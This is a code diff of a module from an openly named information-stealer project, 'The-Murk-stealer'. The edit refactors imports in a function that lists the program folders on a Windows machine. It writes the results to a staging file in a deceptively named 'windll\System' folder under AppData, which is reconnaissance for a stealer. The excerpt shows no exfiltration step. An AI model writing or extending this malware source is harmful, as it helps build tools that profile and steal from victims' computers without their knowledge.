@@ -10,7 +10,7 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-import os
+from os import environ,sep,listdir
 """
 all needed paths
 """
@@ -19,8 +19,8 @@ path1 = r"C:\Program Files"
 
 def Programs():
     try:
-        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        dirs = os.listdir(path)# all dirs in path
+        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
+        dirs = listdir(path)# all dirs in path
         with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
              prog.write(path+"\n")# write it
         prog.close()
@@ -31,7 +31,7 @@ def Programs():
 
 
 
-        dirs = os.listdir(path1)# all dirs in path1
+        dirs = listdir(path1)# all dirs in path1
         with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
              prog.write(path1+"\n")# write it
         prog.close()
